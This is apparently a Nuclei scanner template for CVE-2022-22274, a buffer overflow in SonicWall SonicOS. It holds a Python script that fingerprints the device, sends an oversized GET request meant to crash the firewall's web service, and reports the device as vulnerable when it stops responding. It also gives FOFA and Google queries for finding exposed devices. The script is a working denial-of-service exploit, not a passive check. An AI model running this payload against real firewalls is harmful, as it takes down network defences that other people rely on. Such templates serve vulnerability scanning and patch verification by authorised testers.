id: CVE-2022-22274

info:
  name: SonicOS - Denial of Service via Buffer Overflow
  author: s4e-io
  severity: critical
  description: |
    A Stack-based buffer overflow vulnerability in the SonicOS via HTTP request allows a remote unauthenticated attacker to cause Denial of Service (DoS) or potentially results in code execution in the firewall.
  reference:
    - https://bishopfox.com/blog/its-2024-and-over-178-000-sonicwall-firewalls-are-publicly-exploitable
    - https://www.cvedetails.com/cve/CVE-2022-22274
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-22274
    cwe-id: CWE-121,CWE-787
    epss-score: 0.37324
    epss-percentile: 0.96979
    cpe: cpe:2.3:o:sonicwall:sonicos:*:*:*:*:*:*:*:*
  metadata:
    vendor: sonicwall
    product: sonicos
    fofa-query: icon_hash="631108382"
    google-query: inurl:"auth.html" intitle:"sonicwall"
  tags: cve,cve2022,sonicwall,buffer-overflow,intrusive,kev,dos

variables:
  Host: "{{Host}}"
  Port: "{{Port}}"

code:
  - engine:
      - py
      - python3
    source: |
      import socket
      import ssl
      import requests
      import time
      import urllib3
      import os

      urllib3.disable_warnings()

      def check_sonicwall_product(host, port):
          """
          Check if the target is running SonicOS by looking for the 'Server: SonicWALL' header.
          """
          data = b"GET / HTTP/1.1\r\n\r\n"

          try:
              with socket.create_connection((host, port), timeout=10) as sock:
                  context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                  context.check_hostname = False
                  context.verify_mode = ssl.CERT_NONE

                  with context.wrap_socket(sock, server_hostname=host) as ssock:
                      ssock.sendall(data)
                      resp = ssock.recv(512)

              if b"Server: SonicWALL" in resp:
                  print("[+] Confirmed target is running SonicOS")
                  return True
              else:
                  print("[-] Target is NOT SonicOS. Exiting.")
                  return False

          except Exception as e:
              print(f"[-] Error checking header: {e}")
              return False

      def send_dos_payload(host, port):
          """
          Send exploit payload and after 5 seconds check if the target responds.
          """
          try:
              print("[+] Connecting and sending payload...")
              s = socket.create_connection((host, port), timeout=10)
              ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
              ctx.check_hostname = False
              ctx.verify_mode = ssl.CERT_NONE

              ss = ctx.wrap_socket(s, server_hostname=host)

              payload = b'GET /resources/' + b'A' * 0x400 + b' HTTP/1.1' + b'A' * 0x4000 + b'\r\n\r\n'
              ss.sendall(payload)
              print("[+] Payload sent.")

              ss.close()

              print("[+] Waiting for 5 seconds before checking...")
              time.sleep(5)

              print("[+] Checking if target is still responding...")
              live_check(host, port)

          except Exception as e:
              print(f"[-] Error sending payload: {e}")
              return False

      def live_check(host, port):
          try:
              r = requests.get(f"https://{host}:{port}", verify=False, timeout=10)
              if r.status_code:
                  print("[!] Target is still responding → PATCHED")
              else:
                  print("[!] Target did NOT respond → VULNERABLE")
          except requests.exceptions.RequestException:
              print("[!] Target did NOT connect → VULNERABLE")

      if __name__ == "__main__":
          host = os.getenv("Host")
          port = int(os.getenv("Port") or 443)

          if check_sonicwall_product(host, port):
              send_dos_payload(host, port)
          else:
              exit(0)

    matchers:
      - type: word
        words:
          - "VULNERABLE"
